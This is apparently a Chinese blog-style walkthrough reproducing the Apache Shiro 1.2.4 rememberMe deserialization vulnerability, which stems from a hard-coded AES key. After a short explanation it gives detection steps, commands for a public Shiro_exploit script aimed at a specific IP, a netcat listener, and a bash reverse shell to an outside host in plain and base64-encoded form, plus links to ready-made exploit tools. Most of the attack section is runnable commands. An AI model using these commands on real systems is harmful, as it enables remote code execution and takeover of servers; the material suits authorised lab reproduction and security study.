# 漏洞介绍

Apache
Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理。使用Shiro易于理解的API，开发者可以快速、轻松地获得任何应用程序，从最小的移动应用程序到最大的网络和企业应用程序

在Shiro <=
1.2.4中，反序列化过程中所用到的AES加密的key是硬编码在源码中，当用户勾选RememberMe并登录成功，Shiro会将用户的cookie值序列化，AES加密，接着base64编码后存储在cookie的rememberMe字段中，服务端收到登录请求后，会对rememberMe的cookie值进行base64解码，接着进行AES解密，然后反序列化。由于AES加密是对称式加密（key既能加密数据也能解密数据），所以当攻击者知道了AES
key后，就能够构造恶意的rememberMe cookie值从而触发反序列化漏洞

# poc

使用burp抓取当前页面数据包，在cookie中添加rememberMe=1，在响应包中显示两个Set-Cookie:
rememberMe=deleteMe，说明存在shiro框架可能存在漏洞  
![在这里插入图片描述](https://image.3001.net/images/20220825/1661435554_63077ea2bc7ae8f397974.png!small)

# exp

我的vm虚拟机 kali IP: 192.168.100.131

我的花生壳 映射外网地址 103.46.128.21:49040-> 192.168.100.131:8888  
![在这里插入图片描述](https://image.3001.net/images/20220825/1661435555_63077ea3dcbdcf7aea652.png!small)

## 使用Shiro_exploit进行漏洞利用

项目地址：<https://github.com/insightglacier/Shiro_exploit>

### 检测是否存在shiro漏洞

    
    
    python .\shiro_exploit.py -u http://123.58.224.8:25050/
    

![在这里插入图片描述](https://image.3001.net/images/20220825/1661435556_63077ea484d29be5af83a.png!small)  
vulnerable:True表示存在shiro漏洞

![在这里插入图片描述](https://image.3001.net/images/20220825/1661435557_63077ea582ada645b1213.png!small)

### 反弹shell利用

  * kali 监听

    
    
    nc -lnvp 8888
    

![在这里插入图片描述](https://image.3001.net/images/20220825/1661435558_63077ea64137b84587eee.png!small)

  * 执行利用脚本

    
    
    python shiro_exploit.py -t 3 -u  http://123.58.224.8:25050/  -p "bash加密命令"
    # bash命令
    bash -i >& /dev/tcp/103.46.128.21/49040 0>&1
    # bash加密后命令
    bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDMuNDYuMTI4LjIxLzQ5MDQwIDA+JjE=}|{base64,-d}|{bash,-i}
    
    
    
    python shiro_exploit.py -t 3 -u   http://123.58.224.8:25050/  -p "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDMuNDYuMTI4LjIxLzQ5MDQwIDA+JjE=}|{base64,-d}|{bash,-i}"
    

![在这里插入图片描述](https://image.3001.net/images/20220825/1661435558_63077ea6dada3246e574c.png!small)  
成功反弹shell  
![在这里插入图片描述](https://image.3001.net/images/20220825/1661435560_63077ea8c181dc70cc35d.png!small)

## 使用一键利用工具复现

项目地址：<https://github.com/j1anFen/shiro_attack/releases/tag/2.2>

